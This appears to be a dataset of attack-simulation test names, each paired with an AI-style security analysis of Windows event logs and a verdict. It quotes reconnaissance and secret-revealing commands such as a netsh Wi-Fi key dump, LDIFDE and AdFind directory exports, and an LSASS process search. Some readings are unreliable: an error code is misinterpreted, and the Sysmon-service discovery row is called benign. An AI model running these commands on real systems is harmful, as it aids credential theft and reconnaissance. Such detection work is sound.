- The logs indicate that the changes are performed by ""svchost.exe"", a common Windows process that can be used by malware for concealment.  

**2. Process Execution:**
- Various processes are logged within the Sysmon logs such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe`. 
- The presence of `wevtutil.exe` is not commonly found en masse and can signify log file manipulation or clearing activities.
- `powershell.exe` was executed with the command `Get-Process`, which seems benign but should be considered carefully in the context of other activities.
- There is a process indicating PowerShell usage which is often abused for script-based attacks or lateral movement.

**3. User Activity:**
- The user ""admin_test"" is frequently seen initiating multiple processes. While this could be administrative activity, it's necessary to verify the legitimacy of such actions, especially with the presence of elevated privileges. Several Security Log entries (Event ID 4672) show high-level privileges assigned to this account.

**4. Elevated Privileges and Kerberos Activity:**
- Security logs demonstrate multiple logons and assumed privileges by the user ""admin_test"". The granted privileges include SeDebugPrivilege and SeTakeOwnershipPrivilege, which are high-risk and can potentially indicate privilege escalation attempts or preparations for lateral movement.

**5. Combining Observations:**
- The simultaneous occurrence of these factors, such as rollback of system time, unusual usage of PowerShell, high privilege assignments, and the presence of `wevtutil.exe`, suggests a coordinated activity beyond routine administrative work.
- The ""old time"" and ""new time"" discrepancies are particularly concerning and could be an effort to conceal the exact sequence of events within logs.

### Assessment of the Situation:
Given the above findings, there is a strong indication of activities that could be associated with malicious intent. While each of these components might not be sufficient on their own to conclusive point to malicious activity, their simultaneous occurrence and context within the logs raises a significant level of concern.

### Conclusion and Next Steps:
**Resolution:** **SUSPICIOUS**

This activity merits immediate further investigation:

- **Verify User Actions:** Confirm with the users involved (especially ""admin_test"") about their recent activities and whether the actions recorded were expected.
- **Integrity of System Time:** Investigate any further logs or indicators that could confirm unauthorized time changes.
- **Monitor and Review Privileged Accounts:** All elevated privileges should be verified, ensuring no unauthorized access or privilege assignments have been made.
- **Comprehensive Threat Hunt:** Execute a detailed threat hunt focused on possible persistence methods, lateral movement techniques, and TTPs common to the detected potentially suspicious activities.
- **Implement Alerting:** Set up alerts in the SIEM to monitor for similar activities in the future, especially concerning time change events and process executions indicative of potential log manipulations. 

By reviewing the above actions and ensuring further analysis, you are safeguarding against potential compromise and ensuring the integrity of the network environment."
Active Directory Enumeration with LDIFDE,"Upon reviewing the provided log entries from various sources, here is a detailed analysis:

### Security Logs:
1. **Event ID 4624 (Logon Events):** Multiple entries display successful logon events for the `SYSTEM` user, with Logon Type 5, which indicates a service logon. The process responsible is `services.exe`, which is legitimate. The SYSTEM account typically runs system services, and this alone doesn't suggest malicious activity.

2. **Event ID 4672 (Special Privileges Assigned):** Typical privileges are assigned to the `SYSTEM` account. There are critical privileges like `SeDebugPrivilege` and `SeImpersonatePrivilege`, which if misused, can be dangerous. However, since the SYSTEM account is involved, this activity is standard since this account needs such privileges to perform its operations.

3. **Event ID 5379 (Credential Validation):** Several failed credential validation events (`ReturnCode 3221226021`, often indicating access is denied) show attempts to access MicrosoftAccount services. It is not unusual to see failed attempts in logs, especially if a scheduled task or service attempted and failed to connect. However, the persistent and repeated attempts without successful connection may warrant further monitoring.

4. **Event ID 4798 (User Enumeration):** The `SERVER002$` account is accessing the user listing typically executed by taskhostw.exe related to tasks enumeration. This does not raise immediate flags unless correlated with other anomalies.

### Application Logs:
1. **Event ID 1001 (Windows Error Reporting):** A specific log entry for servicing failures related to the Microsoft-Windows-ActiveDirectory-DS-LDS-Tools-FoD-Package. There's an error due to access being denied (`80070005`), pointing to a permission issue. While this doesn't indicate malicious activity, it signals potential configuration or access problems that need resolving.

### Sysmon Logs:
1. There are various Sysmon Event ID 1 logs observed for process creation:
   - Processes such as `powershell.exe`, `cmd.exe`, and `wevtutil.exe` are used by the `admin_test` user. 
   - Of particular interest is the command executed by `cmd.exe`: `""cmd.exe"" /c ldifde.exe -f C:\\Windows\\temp\\file_ldifde.txt -p subtree`. The use of `ldifde.exe` can be concerning when used to export directory information, potentially indicative of reconnaissance or data extraction if executed by unauthorized users or outside normal operations.

2. Sysmon Event ID 5 logs follow process termination events and align with the process creation logs noted above. `ldifde.exe` execution indicates data was likely extracted, which is typically unauthorized behavior if done unexpectedly or without clear business purposes.

### Assessment:
- **User `admin_test` executed several command-line utilities (`powershell.exe`, `wevtutil.exe`, `cmd.exe`) which are common tools used in post-compromise activities. However, without further contextual information, it is challenging to determine the user's intent or specific anomalous behavior beyond data extraction attempts using `ldifde.exe`.**

### Conclusion:
Given the persistence of the data extraction command and the use of PowerShell and event viewer utility (`wevtutil.exe`), the activity is marked as **SUSPICIOUS**. While there's no direct evidence of a compromise, the actions are worth further investigation to understand the intent, particularly focusing on the use of `ldifde.exe` and whether `admin_test` had a legitimate reason for such actions.

### Recommended Actions:
- **Conduct a user validation for `admin_test`:** Verify if such activity aligns with their role.
- **Audit use of `ldifde.exe`:** Determine if there were legitimate business reasons or if this was an unauthorized action.
- **Continuous Monitoring:** Increase logging and monitoring specifically targeting command-line executions and any unconventional use by administrative accounts. Consider implementing alerts for unusual command usage.
- **Review Permission and Access Controls:** Ensure appropriate permissions are in place, and review any anomalies in access patterns.

A thorough investigation could either disprove initial concerns or uncover more substantial malicious indicators."
Adfind - Enumerate Active Directory Domain Controller Objects,"Based on my detailed analysis of the provided Windows event logs, here are the key observations:

### Application Log:
- The Application log entries for `Windows Defender` show the product state as `SECURITY_PRODUCT_STATE_ON`, which indicates that the system's antivirus (Windows Defender) is active and running.

### System Log:
- The System log primarily contains events related to a `Security Intelligence Update for Microsoft Defender Antivirus`, which is a normal operation for keeping antivirus signatures updated.
- The presence of `Windows Update Client` entries indicates routine update checks, which is typical for maintaining system security and does not indicate any malicious activity.

### Sysmon Log:
- Multiple entries show the execution of common system processes such as `powershell.exe`, `conhost.exe`, `wevtutil.exe`, `cmd.exe`, and `whoami.exe`. These processes are expected on a Windows system.
- A noticeable entry is the execution of `AdFind.exe` with the command `\""cmd.exe\"" /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe\"" -sc dclist`. `AdFind.exe` is a known tool often used to query Active Directory information. If not expected as part of routine administrative tasks, this could indicate suspicious activity.
- The logs show processes related to an ongoing update of Microsoft Edge (`setup.exe`), which generally fits within usual software updates.

### Security Log:
- Events with ID `5379` relate to failed attempts to read credentials, which is typical behavior if access or authentication issues are occurring but does not immediately suggest compromise unless correlated with other unusual activities.

### Assessment:
- **Suspicious Activity:** The use of the `AdFind.exe` tool in the context of a temporary directory raises a flag, as it is often used in reconnaissance activities to gather data about Active Directory environments. This warrants further investigation, especially if the execution was not initiated by authorized personnel.
  
- **Benign Activity:** The rest of the logs indicate routine operations and updates, such as Windows updates and Microsoft Edge updates, which are typical and expected on a system with an active update and security policy.

**Resolution:** **SUSPICIOUS**

### Guidance:
1. **Investigate the Use of AdFind.exe:**
   - Confirm with system administrators whether this execution was performed as part of regular administrative tasks.
   - Check for any other signs of lateral movement or data exfiltration that might suggest malicious intent.

By taking the steps above, you can ascertain the legitimacy of the `AdFind.exe` usage and ensure the continuity of security measures in place."
Enumerate Default Domain Admin Details (Domain),"### Detailed Analysis:

#### 1. Security Log Analysis:
- **Event ID 4634** and **4624**: represent a user logoff and a successful logon event respectively. The user `admin_test` logs on/off from `SERVER002` using Logon Type 3 (Network logon), which is typical for network-based services or remote logins.
  
- **Event ID 4672**: indicates that `admin_test` was assigned special privileges (e.g., SeDebugPrivilege, SeBackupPrivilege, SeLoadDriverPrivilege). While it's not uncommon for administrative accounts to have these privileges, it is noteworthy if this account is not meant to be used frequently, especially alongside the use of NTLM authentication, which could be a potential vector for Pass-the-Hash attacks if not appropriately secured.

#### 2. Application Log Analysis:
- The logs record an update activity for Microsoft Edge (`edgeupdate`) that stopped twice. There doesn't seem to be any abnormal activity associated with these logs, reflecting routine update activities.

#### 3. Sysmon Log Analysis:
- **Process Creations**: `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` under `SERVER002\\admin_test` are observed, which could be indicative of script execution or task automation.
  
- Notably, there is a `cmd.exe` process executing the command `net user administrator /domain`, indicating potential user enumeration or attempt to verify account status, which might require further investigation. This is a command often associated with malicious attempts to gather network user information.
  
- The subsequent execution of `net.exe` and `net1.exe` to query domain user information is suspicious, especially if not part of routine administrative activities.

#### 4. Windows PowerShell Log Analysis:
- No PowerShell activity recorded here, reducing the likelihood of script-based attacks via PowerShell for this specific timeframe.

### Assessment and Resolution:
- **Suspicious Activity**: The `cmd.exe` activity querying the administrator user and subsequent network commands raise suspicion, especially since they are executed by a user with elevated privileges.
  
- **Potential Risks**: Possible reconnaissance activity aimed at gathering domain user information or assessing administrative access. These could indicate either initial penetration/testing phases or legitimate administrative checks, which need clarification.

### Guidance and Recommendations:
- **Further Investigation**: Verify the intent of `admin_test`'s network user queries with the responsible party. Confirm whether such activity is part of normal operations or unauthorized probing.
- **Privilege Review**: Reassess the necessity of the extensive privileges for the `admin_test` account, especially considering the potential risk of misuse.
- **Monitoring and Alerts**: Increase monitoring on the usage of NTLM logins and network queries from privileged accounts to quickly identify any unusual patterns.

**Resolution**: **SUSPICIOUS** - The log activities are suspicious and warrant further investigation to assess whether this accounts for legitimate query requests or potential malicious reconnaissance.

"
System Network Configuration Discovery (TrickBot Style),"After analyzing the provided event logs, here are the findings based on the Windows Security, Sysmon, System, and Application logs:

1. **Security Log Analysis:**
   - Multiple instances of Event ID 5379 indicate attempts to read Microsoft account credentials with a return code of `3221226021`, which translates to `STATUS_LOGON_FAILURE`. This is typically seen when there are failed attempts to access credentials, which could be due to incorrect account configurations or a probing attempt. However, without repeated lockouts or other corroborating signs, these could still be benign.
   - Event ID 4624 with Logon Type 5 indicates a service logon by `SYSTEM`. This is typically normal system behavior associated with Windows services starting.
   - Event ID 4672 indicates a privileged logon session for `admin_test`, which suggests elevated privileges.

2. **Sysmon Log Analysis:**
   - Events related to `MicrosoftEdgeUpdate` and other Microsoft Edge installer processes appear normal given the context of system updates (e.g., product updates like Microsoft Edge). Commands and processes align with updating behavior.
   - The execution of typical system commands (`ipconfig`, `net`, `nltest`) under the `admin_test` account could be routine but, depending on prior network activity and authorization, may warrant looking into administrative actions during this period to confirm legitimacy.
   - Elevated integrity level processes (e.g., PowerShell or Command Prompt with administrative privileges) and their parent-child process chains are typical for legitimate admin activities, but warrant verification due to their potential for misuse.

3. **System Log Analysis:**
   - Windows Update activity appears consistent with normal update processes, installing both a feature update and a security intelligence update for Defender.

4. **Application Log Analysis:**
   - Application installations related to updates (e.g., KB5001716) being logged are expected behavior for Windows Update processes.
   - Security logs related to the Software Protection Platform Service (SPP) and Windows Defender are normal operation logs.

**Threat Assessment:**
- **BENIGN:** Most of the event logs represent normal system operations such as service and admin logons, routine software update installations, and system commands executed in an administrative context.
- **SUSPICIOUS:** The repeated access attempts logged by Event ID 5379 can be seen as potentially suspicious, especially if unauthorized users may have attempted accesses or misconfigurations exist that could be exploited. Additionally, the privilege logon by `admin_test` and subsequent system inspections via command-line utilities might need further review to confirm they align with authorized security or admin activities.

**Resolution:** At this point, the resolution leans towards **BENIGN**, but with some elements marked as **SUSPICIOUS** that warrant a closer review of change management or administrative approval records. Follow-up steps include verifying `admin_test` activities with authorization records and ensuring account configurations do not facilitate unauthorized access."
Launch DirLister Executable,"Upon analyzing the provided Windows event logs, here are the observations and findings:

1. **PowerShell Activity**: There is PowerShell activity logged with the command `Start-Process ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\DirLister.exe""`. This execution is wrapped in a PowerShell command with a `Start-Sleep -Second 4; Stop-Process -Name ""DirLister""` sequence, indicating the program was deliberately started and then stopped after 4 seconds. The use of PowerShell for such operations could potentially indicate scripting activity which may be used for automation or by malicious entities to execute payloads.

2. **DirLister.exe Execution**: The Sysmon logs show that `DirLister.exe` was executed from a temporary path typical for staging files, especially since it's run from a Powershell command. This behavior is somewhat suspicious because execution from temporary directories can indicate malicious behavior, especially if the executable is not commonly used or recognized.

3. **Sysmon Events Related to Edge Update**: There are multiple Sysmon logs of processes related to `MicrosoftEdgeUpdate.exe`. These include standard update and installation operations, often legitimate background update services by Microsoft Edge. The behavior seems consistent with legitimate update processes without any clear indicators of compromise such as unusual command-line arguments or execution paths.

4. **Host System Processes**: The logs capture various standard processes such as `taskhostw.exe`, `wermgr.exe` (Windows Problem Reporting), `svchost.exe`, and others performing routine operations, which do not appear out of place given the environment context.

5. **Use of Network Service and System Level Execution**: Several processes are executing under the `NT AUTHORITY\SYSTEM` and `NT AUTHORITY\NETWORK SERVICE` accounts, which is standard for many system-level processes and services including Edge updates and system maintenance operations.

**Assessment**:

- The execution of `DirLister.exe` via PowerShell from a temporary location is the most concerning activity in the logs. While this alone does not confirm malicious intent, it is suspicious and warrants further investigation to verify the legitimacy of this application and its purpose within the environment.

- The presence of MicrosoftEdgeUpdate.exe activities suggests routine software updates and does not by itself indicate compromise or maliciousness.

**Resolution**: 

Based on the analysis, the conclusion is **SUSPICIOUS** due to the presence of a potential non-standard PowerShell execution of an unknown file. Further investigation should focus on:

- Investigating the origin and legitimacy of the `DirLister.exe` file, including verifying its source, purpose, and whether it is expected in this environment.
- Checking if there are more instances or similar patterns of PowerShell executing unverified binaries.
- Ensuring antivirus or endpoint security tools are updated and performing a scan on the host for any other indicators of compromise.

These steps will help clarify whether this suspicious activity is benign or potentially malicious."
Azure Security Scan with SkyArk,"Upon analysis of the provided Windows event logs, several observations and potential indicators of compromise were identified, particularly relating to the PowerShell logs:

### Analysis:

1. **PowerShell Execution:**
   - The PowerShell script `AzureStealth.ps1` is being executed, which is located in a temporary directory path: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\AzureStealth.ps1`.
   - This script attempts to connect to Azure services using hardcoded credentials (`ConvertTo-SecureString -String ""dataAz"" -AsPlainText -Force`) which is considered a poor security practice and often associated with malicious scripts.
   - The module attempts to connect to Azure services and execute `Scan-AzureAdmins -UseCurrentCred`, which could potentially allow enumeration of Azure administrators or accounts.

2. **Suspicious Command Usage:**
   - `Add-Type` with C# code injection: The logs detail the usage of `Add-Type` to compile and execute C# code dynamically, which is a common technique used by attackers for executing arbitrary code within a PowerShell session.

3. **Process Execution:**
   - Sysmon logs show the execution of processes `powershell.exe` and `conhost.exe` under the user `SERVER002\admin_test`, coinciding with the suspicious PowerShell activity.
   - The presence of processes such as `csc.exe` (C# compiler) and `cvtres.exe` indicates attempts to compile code, further suggesting code execution attempts.

4. **Security Logs and Privileged Use:**
   - Event ID 4672 indicates that a user `admin_test` is exercising a range of privileged activities (e.g., SeDebugPrivilege, SeImpersonatePrivilege), potentially linked to the suspicious PowerShell activity.
   - Logon and privilege escalation events for `admin_test` may suggest an attempt to escalate privileges or perform actions requiring elevated rights.

### Conclusion:

Based on the evidence from the PowerShell and Sysmon logs, specifically the execution of a potentially unauthorized PowerShell script named `AzureStealth.ps1`, embedding credentials, and attempting to enumerate Azure administrators, along with suspicious privilege use, the activities recorded in the logs are indicative of potential malicious activity. 

### Recommendation:

- **Resolution: MALICIOUS**
  - Immediately investigate the source and purpose of the `AzureStealth.ps1`.
  - Isolate the server `Server002` to prevent further unauthorized access or potential information leakage.
  - Reset the credentials involved and review all Azure Active Directory activities for any unauthorized access.
  - Conduct a thorough forensic analysis to identify any further compromise and evaluate the full scope of the incident.

Ensure that security policies are updated to prevent the execution of scripts from unsecured or temporary directories and that appropriate logging and alerting are in place to detect such activities in the future."
System Discovery - SocGholish whoami,"Upon reviewing the provided logs, here is a detailed analysis of any suspicious behavior or indicators of compromise:

1. **Security Log (Event ID: 5379):**
   - Multiple events indicate attempts to access credentials related to Microsoft Account and WindowsLive tokens. All these attempts resulted in failure with a return code `3221226021`, which typically means a login failure due to invalid credentials.
   - These repeated failures to access credential-related operations might indicate an automated script or a malicious actor attempting to gain unauthorized access.

2. **Sysmon Log (Event ID: 1 and 5):**
   - The processes `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `hostname.exe`, and `powershell.exe` involved are common in normal operations; however, their combined usage often in red team operations or malicious contexts to enumerate and dump system information.
   - Analyzing the command line for `powershell.exe`: 
     ```
     ""powershell.exe"" & {$TokenSet = @{, U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ', N = [Char[]]'0123456789', }, $Upper = Get-Random -Count 5 -InputObject $TokenSet.U, $Number = Get-Random -Count 5 -InputObject $TokenSet.N, $StringSet = $Upper + $Number, $rad = (Get-Random -Count 5 -InputObject $StringSet) -join '', $file = \""rad\"" + $rad + \"".tmp\"", whoami.exe /all >> $env:temp\\$file
     ```
   - This indicates the script was used to generate random strings and redirect the output of `whoami.exe /all` to a temporary file. Such behavior could point to profiling the system silently and storing that information, which is suspicious and often seen during reconnaissance phases of an attack.

3. **PowerShell Log (Event ID: 600, 400, 403):**
   - The PowerShell command executed aligns with suspicious activity as seen in the Sysmon logs. The script's purpose appears to perform extensive user information enumeration, which runs the `whoami.exe` command quietly and stores results temporarily, indicating potential information gathering by a malicious actor.

4. **System Log (Event ID: 44, 43):**
   - It's noted that security intelligence updates for Microsoft Defender Antivirus were successfully fetched and installed, which is typical system maintenance and doesn't by itself indicate suspicious activity.

### Assessment and Conclusion:

While the security intelligence updates in the system log align with benign activity, the security, sysmon, and PowerShell logs reveal potentially SUSPICIOUS behaviors:
- The PowerShell and process executions observed could be legitimate administrative or testing actions, but the nature of the command executed — enumerating user information and potentially exporting into temp files using obfuscated scripts — leans towards information gathering by unauthorized means.
- The access attempts resulting in errors might point to either poor configuration, testing or an indicator of credential access attempts by an actor.

**Resolution: SUSPICIOUS**

**Guidance:**
- Further investigation is needed to determine the legitimacy of the PowerShell execution. 
- Conduct a user review and activity validation of the user ""admin_test"".
- Analyze the context around these failed credential attempts.
- Look for any similar scripts or scheduled tasks within the environment.
- Correlate with network logs for outbound connections post these timestamps for potential exfiltration activity. 

Following these steps should help in understanding if these activities are part of legitimate actions or indicators of a compromised internal account or a foothold attempt."
Discover Specific Process - tasklist,"### Detailed Analysis

Upon reviewing the provided Sysmon, System, Application, Security, and Windows PowerShell logs, the following observations and assessments have been made:

#### Sysmon Log

1. **Repeated Execution of `wevtutil.exe` and `conhost.exe`**:
   - The frequent execution of `wevtutil.exe`, paired with `conhost.exe`, under the user `SERVER002\admin_test`, indicates potential interaction with Windows event logs.
   - Application of `wevtutil.exe` for legitimate administrative purposes is common; however, recurring usage may point towards scrubbing or reviewing logs which could be suspicious if it coincides with other anomalous activities.
   
2. **Execution of `cmd.exe` with `tasklist` and pipe to `findstr` for `lsass`**:
   - The execution of the command `""cmd.exe"" /c tasklist | findstr lsass` suggests a search for processes related to LSASS (Local Security Authority Subsystem Service), a known target for credential dumping attacks.
   - Although such commands may have administrative usage scenarios, their presence should be contextually evaluated for intent.

3. **Utilization of Standard Utilities (`HOSTNAME.EXE`, `WHOAMI.EXE`)**:
   - Execution of standard administrative tools such as `hostname.exe` and `whoami.exe` by the same user may point towards system enumeration activities which can be benign or part of reconnaissance in a malicious scenario.

#### System Log

1. **Time Changes Logged**:
   - The log entries noted under `Microsoft-Windows-Kernel-General` displaying changes in system time and an unusual reverting back of system time can indicate a deliberate attempt to modify time stamps which is a technique for log evasion or intrusion cover-up.

#### Security Log

1. **Time Changes by `svchost.exe`**:
   - The security logs confirm time manipulation attempts by `svchost.exe`, reinforcing the notion of potential malicious intent to alter time stamps within the system.

#### Application Log

- No suspicious or anomalous entries found. The log primarily includes routine tasks related to the `Software Protection Platform Service`.

### Assessment and Resolution

The logs exhibit several activities that constitute a potential cause for concern:

- Frequent executions of `wevtutil.exe` and commands aimed at enumerating system processes, particularly those dealing with credentials (`lsass`).
- Alteration of system time by `svchost.exe` which can be used to mask malicious activity.

Given the observed patterns, resolution would best be categorized as **SUSPICIOUS**. The activities highlighted warrant a deeper investigation to rule out malicious behavior definitively. This includes:

- Verifying the legitimacy of the user `admin_test` and confirming multiple activities with the system owner.
- Investigating why the time manipulation occurred and examining the rationale behind the command sequences executed.
- Checking for any similar patterns or activities that tie into known threat actor tactics, techniques, and procedures (TTPs).

**Guidance on How to Proceed**:
- Conduct a forensic review focusing on artifacts such as Windows event logs, network logs, and potential memory captures.
- Perform integrity checks on system registry changes and file modifications.
- Monitor for continued suspicious behavior and possibly consider user account review or disabling during the investigation.

Ultimately, this investigation requires corroboration with other security measures to either mitigate emerging threats or confirm benign actions in context."
SharpHound3 - LocalAdmin,"**Detailed Analysis:**

### Security log:

1. **Event ID 4624 (Successful Logon)**:
   - The log shows a type 5 logon which is a service logon. It was performed by SYSTEM on Server002.
   - The process involved is `services.exe`, a legitimate system process.
   - This event seems routine without any immediate indicators of compromise.

2. **Event ID 4672 (Special Privileges Assigned to New Logon)**:
   - SYSTEM gained multiple privileges, including `SeDebugPrivilege`, which is powerful and could be exploited for privilege escalation.
   - While SYSTEM usually has these privileges, no context indicates abuse right now.

### Sysmon log:

1. **Event ID 1 and Event ID 5 (Process Creation and File Creation)**:
   - **Processes Involved:**
     - `SecurityHealthService.exe`, `powershell.exe`, `conhost.exe`, `sppsvc.exe`, `wevtutil.exe`, `HOSTNAME.EXE`, `whoami.exe`, `wbem\\WmiPrvSE.exe`, `TiWorker.exe`, `TrustedInstaller.exe`, `MicrosoftEdgeUpdate.exe`, `taskhostw.exe`.
     - Notably, `powershell.exe`, `wevtutil.exe`, and `conhost.exe` executed under `SERVER002\\admin_test` account, indicating potential manual or scripted activity.
     - There is a PowerShell command that creates a directory and executes a suspiciously obfuscated script targeting directories that seem to be related to user profiles and possibly network-oriented operations.
   
   - This PowerShell activity is highly suspicious:
     - **Command line activity:**
       - The command `New-Item -Path \""$env:TEMP\\script\\\""` indicates creating directories.
       - Execution of `script.exe` from a temporary directory may indicate potential malware execution or intrusion tool use.
       - Parameters like `--CollectionMethod LocalAdmin --NoSaveCache` often point to data collection or evasion techniques.

2. **Event ID 5 (conhost.exe associations)**:
   - `conhost.exe` is typically a legitimate process for hosting command interfaces. Here, its repetitive appearance alongside suspicious PowerShell activity indicates potential abuse to hide malicious command execution.

### Application log:

- **Windows Defender is active:** 
  - No immediate alerts from Windows Defender in the logs, though active status is recorded. This doesn't necessarily rule out stealthy behavior that bypasses detection.

### Windows PowerShell log:

- PowerShell ran a command that ties into the suspicious Sysmon activity. The command aligns with the suspicious behavior observed, further reinforcing the potential malicious nature of the activity.

### Assessment:
- **Potential Risk**: The combination of *script execution*, use of PowerShell with obfuscated commands, and involvement of a non-system admin user (`SERVER002\\admin_test`) suggest risk and warrant further investigation.
- **Possible Threat**: Suspected use of a malicious script/executable (`script.exe`) indicative of an advanced persistent threat (APT) or other attack leveraging administrative privileges.
  
### Guidance and Resolution:
- **Resolution** - **SUSPICIOUS**:
  - Recommend isolating Server002 positively identified as potentially compromised.
  - Conduct a detailed forensic analysis of `script.exe` and any output from its execution to determine its purpose and impact.
  - Review user account `admin_test` for unauthorized privileges or activities.
  - Consider network monitoring for any outbound connections initiated post-suspicious activity.
  - Enhance PowerShell logging and restrict administrative access to ensure scripts, especially with potential impact, are scrutinized closely.
"
Enumerate Stored Wi-Fi Profiles And Passwords via netsh,"Upon thorough analysis of the provided logs, several observations and examinations yield the following findings:

### 1. Time Manipulation
- **Events 4616 and 1 in the Security and System logs** indicate changes in system time. The logs show discrepancies in the PreviousTime and NewTime values, suggesting manual adjustment of the system clock. This behavior is often suspicious as adversaries sometimes change system time to manipulate logs or bypass security measures related to timestamp checks.

### 2. Privileged Account Activities
- **Events 4672 and 4624 in the Security logs** reveal the use of a user account ""admin_test"" with elevated privileges, including SeDebugPrivilege, SeTakeOwnershipPrivilege, etc. This can be a normal operation but is notable if the user account is not commonly associated with administrative tasks.

### 3. Execution of Potentially Malicious Commands
- **Sysmon event data** points out execution of:
  - `C:\\Windows\\System32\\HOSTNAME.EXE` and `C:\\Windows\\System32\\whoami.exe` which are non-suspicious utilities but in the context of investigation could be used to gather system and user information.
  - Command using `cmd.exe` executes `netsh wlan show profile * key=clear`. This command is used to reveal stored WiFi passwords, which could suggest information gathering activities.

### 4. Credential Access Events
- **Event 5379 in Security logs** indicates several attempts to access credentials associated with a Microsoft account. The return code of `3221226021` typically indicates a failure, which might suggest unsuccessful credential access attempts.

### 5. Routine Update Events
- **System and Sysmon logs reveal process executions** related to updates, such as `wuauclt.exe` and `AM_Delta.exe`, consistent with Windows Update behavior, aligning with the updated definitions for Microsoft Defender Antivirus.

### 6. Execution of Legitimate System Processes
- **Sysmon logs show execution of standard system processes** such as `svchost.exe`, `conhost.exe`, `taskhostw.exe` used routinely by Windows for various legitimate processes.

### Assessment
While several activities observed such as command execution for revealing WiFi profiles and time manipulation appear suspicious, there are no definitive indicators of compromise or outright malicious activities. These events warrant further investigation to determine the context and intent, especially focusing on the user account ""admin_test"" for unauthorized usages and manual system time adjustments.

### Resolution
- **SUSPICIOUS** - The logs contain activities and commands suggesting potentially undesired actions that need more investigation, especially concerning user activities and the intent of system time changes.

### Guidance on Next Steps
- Investigate the activities around the ""admin_test"" user, focusing on why elevated privileges were required and what actions followed.
- Confirm any legitimate necessity for altering system time and compare it with any known application requirements.
- Examine the originating system or user for the command revealing WiFi keys for further understanding of the intent.
- Continue monitoring for any further suspicious behavior or an increase in similar activities.

These steps should help in understanding the security posture and potential threat risks to the system."
Security Software Discovery - Sysmon Service,"Upon analyzing the provided Windows event logs from the PowerShell, Security, Sysmon, Application, and System channels, the following observations and assessments have been made:

### Analysis of Logs:

1. **PowerShell Logs:**
   - Currently not provided; no analysis can be performed without specific PowerShell log data.

2. **Security Logs (Event ID 4616):**
   - The events pertain to system time changes by the `svchost.exe` process under the `LOCAL SERVICE` account. This could imply a legitimate Windows Time Service operation, adjusting the system time based on an NTP server, as this is commonly seen for synchronizing the system clock.

3. **Sysmon Logs:**
   - **Process Creation (Event ID 1 & 5):** Various executions were noted related to normal system processes such as `svchost.exe`, `wevtutil.exe`, and Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe` and related executables).
   - **Edge Update Activity:** Multiple entries indicate the update process for Microsoft Edge, showing expected behavior for a system undergoing automatic updates.
   - The logs exhibit execution of utilities like `whoami.exe`, `HOSTNAME.EXE`, and command-line executions like `cmd.exe` launching `fltmc.exe` piped through `findstr.exe`. While somewhat less common for non-administrative tasks, these do not by themselves indicate an immediate compromise, as they may relate to system diagnostics or legitimate administrative tasks.
   - **WSM Provider Host Execution:** `wsmprovhost.exe` running with the `-Embedding` flag follows a usual pattern seen for legitimate Windows Management Instrumentation (WMI) related activities.

4. **Application Logs:**
   - **Software Protection Platform Service:** Regular entries were noted. One entry references stopping of an unspecified service, likely related to procedural or scheduled maintenance/service stop actions. There are no anomalous or actionable events noted here.

5. **System Logs:**
   - **Time Synchronization (Event ID 1, 24, 35):** These confirm the system's regular time synchronization activities with the time source `time.windows.com`, evidencing the adjustment made in the security logs.

### Assessment:

The logs collectively indicate normal system operations without any clear signs or evidence of malicious activity. Processes and activities observed align with standard operating procedures for time synchronization, software updates, and system administration tasks.

- There are no direct indicators of compromise (IoC) such as unusual command line arguments, privilege escalation attempts, or execution of unrecognized software.
- Frequent `svchost.exe` activities and Microsoft Edge updates are typical and don't carry inherently suspicious markers, nor do the various command line utilities used, without further context.

### Conclusion:

**Resolution: BENIGN**

The observed activities within these logs reflect benign system operations. Nevertheless, it is advisable to maintain routine monitoring, especially around the noted 'test' user actions, to quickly identify any deviations from the baseline behavior indicative of potential future threats. Further proactive threat-hunting exercises can also be performed to confirm environmental integrity.
"
Remote System Discovery - net group Domain Controller,"Upon analyzing the provided Windows event logs, here's a detailed breakdown of the activities observed across different logs:

### System Log Analysis:
1. **Kernel-General Event (EventID 15):**
   - A registry hive size change is noted, which could occur under normal operation such as software installation or update.

2. **Time-Service Event (EventID 35):**
   - Sync operation with an NTP server (`time.windows.com`). This appears as a routine time synchronization event which is typically benign.

3. **WindowsUpdateClient Events (EventID 44, 43, 19):**
   - There are logs indicating a Security Intelligence Update for Microsoft Defender Antivirus. These updates appear legitimate and are corroborated by event IDs associated with Windows system update activities.

### Sysmon Log Analysis:
1. **Process Creation Events (EventID 1):**
   - The processes executed include `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, `cmd.exe`, `net.exe`, and `net1.exe`. These processes may appear legitimate under normal contexts.
   - Specifically, the command `cmd.exe /c net group /domain ""Domain controllers""` indicates a query for domain controllers. While this could be legitimate administrative activity, it warrants further investigation to rule out reconnaissance activity by a malicious actor.

2. **File Create Stream Hash Events (EventID 5):**
   - Regular file hashing events, generally part of normal Sysmon operations for monitoring system activities.

### Security Log Analysis:
1. **Credential Validation Events (EventID 5379):**
   - Failures with return code `3221226021`, typically indicating a failure or an inability to validate credentials. This is often seen in network and service authentication issues and may not necessarily indicate suspicious activity unless corroborated with other signs.

### Application Log Analysis:
1. **Security Center Event (EventID 15):**
   - Indicates that Windows Defender is active and operational.

### Assessment Summary:
- **Benign Activities:** The registry size change, time synchronization, and regular antivirus updates are all benign activities.
- **Potentially Suspicious Activities:** The execution of `net.exe` and `net1.exe` with the command to list domain controllers should be examined carefully. This could either be a legitimate administrative action or reconnaissance activity that may precede data exfiltration or lateral movement.
- **Credential Failures:** Repeated credential reading failures could be due to configuration issues, but consistent patterns warrant monitoring.

### Final Resolution:
- **Resolution:** **SUSPICIOUS**
- **Rationale:** The observed command querying domain controllers (`net group /domain ""Domain controllers""`) is suspicious as it could indicate reconnaissance activities. While other activities are legitimate or benign, this particular execution demands further investigation to determine the context and the intent behind it.

### Guidance:
1. **Further Investigation:** Verify the user account (`SERVER002\\admin_test`) and the context in which `net.exe` was executed. Check for authorization and necessity of this action.
2. **Network Logs Review:** Assess network logs around the same time for unusual outbound connections that might correlate with suspicious reconnaissance.
3. **User Education:** If the action is benign but misinformed, educate the user on appropriate network commands within the security policy.
